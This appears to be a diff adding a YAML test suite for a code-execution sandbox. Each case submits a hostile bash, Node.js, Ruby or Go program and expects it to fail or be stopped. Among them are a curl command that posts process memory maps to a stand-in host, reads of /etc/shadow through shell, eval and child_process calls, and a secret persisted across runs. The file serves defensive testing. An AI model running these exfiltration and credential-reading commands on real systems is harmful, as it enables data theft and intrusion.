@@ -1,0 +1,214 @@
+tests:
+  - name: "stage 1 recon + stage 2 exfiltrate via curl"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                data=$(cat /proc/self/maps | head -5)
+                curl -sS http://10.0.0.1:4444/ -d "$data"
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              output: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              exit_code: 7
+              status: "OK"
+              signal: null
+
+  - name: "write script to /tmp and execute via interpreter"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                echo 'cat /etc/shadow' > /tmp/payload.sh
+                bash /tmp/payload.sh
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "cat: /etc/shadow: No such file or directory\n"
+              output: "cat: /etc/shadow: No such file or directory\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Node.js child_process.exec for arbitrary command execution"
+    requests:
+      - input:
+          runtime: node
+          files:
+            - name: index.js
+              type: plain
+              content: |
+                const { execSync } = require("child_process");
+                execSync("cat /etc/shadow", { stdio: "inherit" });
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "cat: /etc/shadow: No such file or directory\nnode:child_process:1000\n    throw err;\n    ^\n\nError: Command failed: cat /etc/shadow\n    at genericNodeError (node:internal/errors:985:15)\n    at wrappedFn (node:internal/errors:539:14)\n    at checkExecSyncError (node:child_process:925:11)\n    at execSync (node:child_process:997:15)\n    at Object.<anonymous> (/sandbox/index.js:2:1)\n    at Module._compile (node:internal/modules/cjs/loader:1812:14)\n    at Object..js (node:internal/modules/cjs/loader:1943:10)\n    at Module.load (node:internal/modules/cjs/loader:1533:32)\n    at Module._load (node:internal/modules/cjs/loader:1335:12)\n    at wrapModuleLoad (node:internal/modules/cjs/loader:255:19) {\n  status: 1,\n  signal: null,\n  output: [ null, null, null ],\n  pid: 8,\n  stdout: null,\n  stderr: null\n}\n\nNode.js v24.14.0\n"
+              output: "cat: /etc/shadow: No such file or directory\nnode:child_process:1000\n    throw err;\n    ^\n\nError: Command failed: cat /etc/shadow\n    at genericNodeError (node:internal/errors:985:15)\n    at wrappedFn (node:internal/errors:539:14)\n    at checkExecSyncError (node:child_process:925:11)\n    at execSync (node:child_process:997:15)\n    at Object.<anonymous> (/sandbox/index.js:2:1)\n    at Module._compile (node:internal/modules/cjs/loader:1812:14)\n    at Object..js (node:internal/modules/cjs/loader:1943:10)\n    at Module.load (node:internal/modules/cjs/loader:1533:32)\n    at Module._load (node:internal/modules/cjs/loader:1335:12)\n    at wrapModuleLoad (node:internal/modules/cjs/loader:255:19) {\n  status: 1,\n  signal: null,\n  output: [ null, null, null ],\n  pid: 8,\n  stdout: null,\n  stderr: null\n}\n\nNode.js v24.14.0\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Ruby system() for shell command injection"
+    requests:
+      - input:
+          runtime: ruby
+          files:
+            - name: main.rb
+              type: plain
+              content: |
+                system("cat /etc/shadow")
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "cat: /etc/shadow: No such file or directory\n"
+              output: "cat: /etc/shadow: No such file or directory\n"
+              exit_code: 0
+              status: "OK"
+              signal: null
+
+  - name: "crypto mining attempt is terminated by timeout"
+    requests:
+      - input:
+          runtime: node
+          files:
+            - name: index.js
+              type: plain
+              content: |
+                let x = 0;
+                while (true) {
+                  x = Math.sqrt(x + Math.random()) * Math.PI;
+                }
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: ""
+              output: ""
+              exit_code: 137
+              status: "TIMEOUT"
+              signal: "SIGKILL"
+
+  - name: "persist data in /tmp then steal in second request"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                echo "STOLEN_SECRET=password123" > /tmp/persist.txt
+                echo "persisted"
+        output:
+          status: 200
+          body:
+            run:
+              stdout: "persisted\n"
+              stderr: ""
+              output: "persisted\n"
+              exit_code: 0
+              status: "OK"
+              signal: null
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                cat /tmp/persist.txt
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "cat: /tmp/persist.txt: No such file or directory\n"
+              output: "cat: /tmp/persist.txt: No such file or directory\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Ruby eval of dynamically constructed exploit code"
+    requests:
+      - input:
+          runtime: ruby
+          files:
+            - name: main.rb
+              type: plain
+              content: |
+                payload = "File.read('/etc/shadow')"
+                eval(payload)
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "(eval at /sandbox/main.rb:2):1:in 'IO.read': No such file or directory @ rb_sysopen - /etc/shadow (Errno::ENOENT)\n\tfrom (eval at /sandbox/main.rb:2):1:in '<main>'\n\tfrom /sandbox/main.rb:2:in 'Kernel#eval'\n\tfrom /sandbox/main.rb:2:in '<main>'\n"
+              output: "(eval at /sandbox/main.rb:2):1:in 'IO.read': No such file or directory @ rb_sysopen - /etc/shadow (Errno::ENOENT)\n\tfrom (eval at /sandbox/main.rb:2):1:in '<main>'\n\tfrom /sandbox/main.rb:2:in 'Kernel#eval'\n\tfrom /sandbox/main.rb:2:in '<main>'\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Node.js eval of dynamically constructed exploit code"
+    requests:
+      - input:
+          runtime: node
+          files:
+            - name: index.js
+              type: plain
+              content: |
+                const fs = require("fs");
+                const payload = "fs.readFileSync('/etc/shadow')";
+                eval(payload);
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "node:fs:560\n  return binding.open(\n                 ^\n\nError: ENOENT: no such file or directory, open '/etc/shadow'\n    at Object.openSync (node:fs:560:18)\n    at Object.readFileSync (node:fs:444:35)\n    at eval (eval at <anonymous> (/sandbox/index.js:3:1), <anonymous>:1:4)\n    at Object.<anonymous> (/sandbox/index.js:3:1)\n    at Module._compile (node:internal/modules/cjs/loader:1812:14)\n    at Object..js (node:internal/modules/cjs/loader:1943:10)\n    at Module.load (node:internal/modules/cjs/loader:1533:32)\n    at Module._load (node:internal/modules/cjs/loader:1335:12)\n    at wrapModuleLoad (node:internal/modules/cjs/loader:255:19)\n    at Module.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:154:5) {\n  errno: -2,\n  code: 'ENOENT',\n  syscall: 'open',\n  path: '/etc/shadow'\n}\n\nNode.js v24.14.0\n"
+              output: "node:fs:560\n  return binding.open(\n                 ^\n\nError: ENOENT: no such file or directory, open '/etc/shadow'\n    at Object.openSync (node:fs:560:18)\n    at Object.readFileSync (node:fs:444:35)\n    at eval (eval at <anonymous> (/sandbox/index.js:3:1), <anonymous>:1:4)\n    at Object.<anonymous> (/sandbox/index.js:3:1)\n    at Module._compile (node:internal/modules/cjs/loader:1812:14)\n    at Object..js (node:internal/modules/cjs/loader:1943:10)\n    at Module.load (node:internal/modules/cjs/loader:1533:32)\n    at Module._load (node:internal/modules/cjs/loader:1335:12)\n    at wrapModuleLoad (node:internal/modules/cjs/loader:255:19)\n    at Module.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:154:5) {\n  errno: -2,\n  code: 'ENOENT',\n  syscall: 'open',\n  path: '/etc/shadow'\n}\n\nNode.js v24.14.0\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Go compile-time network access is blocked by GOPROXY=off"
+    requests:
+      - input:
+          runtime: go
+          files:
+            - name: main.go
+              type: plain
+              content: |
+                package main
+
+                import (
+                	_ "github.com/nonexistent/malicious-package"
+                )
+
+                func main() {}
+        output:
+          status: 200
+          body:
+            compile:
+              stdout: ""
+              stderr: "main.go:4:2: no required module provides package github.com/nonexistent/malicious-package; to add it:\n\tgo get github.com/nonexistent/malicious-package\n"
+              output: "main.go:4:2: no required module provides package github.com/nonexistent/malicious-package; to add it:\n\tgo get github.com/nonexistent/malicious-package\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+            run: null
